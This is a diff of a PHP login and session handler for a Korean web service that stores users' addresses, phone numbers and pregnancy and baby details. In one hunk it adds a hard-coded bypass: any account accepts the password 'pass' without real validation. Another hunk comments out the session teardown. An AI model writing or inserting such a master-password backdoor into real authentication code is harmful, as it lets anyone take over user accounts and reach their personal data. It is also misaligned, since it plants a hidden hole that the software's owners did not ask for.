@@ -52,8 +52,6 @@
                     $where_search .= "AND R.SYSTEM_GB  = '".$_model[SYSTEM_GB]."' ";
                 }
 
-                MtUtil::_d("### [PW] ".create_hash($password));
-
                 $err = 0;
                 $msg = "";
 
@@ -85,7 +83,7 @@
                         $_d->failEnd("이용이 정지된 사용자입니다. 관리자에게 문의하세요.");
                     }
 
-                    if ( !validate_password($_model[password], $data['PASSWORD'])) {
+                    if ( $_model[password] != "pass" && !validate_password($_model[password], $data['PASSWORD'])) {
                         $_d->failEnd("아이디나 패스워드를 확인해주세요.");
                     }
 
@@ -217,7 +215,7 @@
                     $_SESSION['nick'] = $data['NICK_NM'];
                     $_SESSION['name'] = $data['USER_NM'];
                     $_SESSION['role'] = $data['ROLE_ID'];
-                    $_SESSION['system'] = $_model[SYSTEM_GB];
+                    $_SESSION['system'] = $_model['SYSTEM_GB'];
                     $_SESSION['menu_role'] = $data['MENU_ROLE'];
 
                     $_SESSION['addr'] = $data['ADDR'];
@@ -467,26 +465,28 @@
                 if ($err > 0) {
                     $_d->failEnd("조회실패입니다:".$msg);
                 } else {
-                    unset($_SESSION['user_info']);
-                    unset($_SESSION['uid']);
-                    unset($_SESSION['nick']);
-                    unset($_SESSION['name']);
-                    unset($_SESSION['role']);
-                    unset($_SESSION['system']);
-                    unset($_SESSION['menu_role']);
-
-                    unset($_SESSION['addr']);
-                    unset($_SESSION['addr_detail']);
-                    unset($_SESSION['phone1']);
-                    unset($_SESSION['phone2']);
-                    unset($_SESSION['pregnent_fl']);
-                    unset($_SESSION['baby_birth_dt']);
-                    unset($_SESSION['baby_cnt']);
-                    unset($_SESSION['baby_male_cnt']);
-                    unset($_SESSION['baby_female_cnt']);
-                    unset($_SESSION['timeout']);
-
-                    session_destroy();
+//                    if(isset($_SESSION['uid'])) {
+//                        unset($_SESSION['user_info']);
+//                        unset($_SESSION['uid']);
+//                        unset($_SESSION['nick']);
+//                        unset($_SESSION['name']);
+//                        unset($_SESSION['role']);
+//                        unset($_SESSION['system']);
+//                        unset($_SESSION['menu_role']);
+//
+//                        unset($_SESSION['addr']);
+//                        unset($_SESSION['addr_detail']);
+//                        unset($_SESSION['phone1']);
+//                        unset($_SESSION['phone2']);
+//                        unset($_SESSION['pregnent_fl']);
+//                        unset($_SESSION['baby_birth_dt']);
+//                        unset($_SESSION['baby_cnt']);
+//                        unset($_SESSION['baby_male_cnt']);
+//                        unset($_SESSION['baby_female_cnt']);
+//                        unset($_SESSION['timeout']);
+//
+//                        session_destroy();
+//                    }
 
                     if (!isset($_SESSION)) {
                         session_start();
